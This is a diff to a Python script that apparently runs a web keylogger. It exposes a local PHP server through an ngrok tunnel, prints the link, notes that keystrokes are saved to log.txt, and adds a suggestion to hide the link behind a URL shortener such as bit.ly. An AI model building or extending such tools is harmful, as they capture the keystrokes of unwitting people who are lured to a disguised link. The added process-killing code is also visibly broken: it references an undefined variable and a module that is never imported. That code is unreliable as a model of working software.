@@ -5,7 +5,10 @@ import os, time, subprocess
 from sys import platform, exit
 import pyfiglet as figlet
 from pyngrok import ngrok
+import pyshorteners
 warnings.filterwarnings("ignore")
+
+urlsh = pyshorteners.Shortener()
 
 if platform == "win32":
   clear = "cls"
@@ -51,6 +54,7 @@ def program():
   ngrok.connect(8080, bind_tls=True)
   url = ngrok.get_tunnels()
   print(url)
+  print("You can use a Url Shortener's like bit.ly")
   print("Please copy the link")
   input("[ PRESS ANY KEY TO CONTINUE ]")
   input("[ PRESS ANY KEY TO CONFIRM ]")
@@ -65,6 +69,21 @@ try:
     program()
 except KeyboardInterrupt:
   ngrok.kill()
+  if platform == "win32":
+    try:
+      os.system("taskkill /im php.exe")
+    except:
+      print("Error Killing PHP process please kill the process manually")
+  else:
+    name = "php"
+    try:
+      os.popen("ps ax | grep " + name + " | grep -v grep")
+      fields = line.split()     
+      pid = fields[0]
+      os.kill(int(pid), signal.SIGKILL)
+    except:
+      print("Error Killing PHP process please kill the process manually")
+  
   os.system(clear)
   print("Keylog save as : log.txt")
   print("\nExitting...")
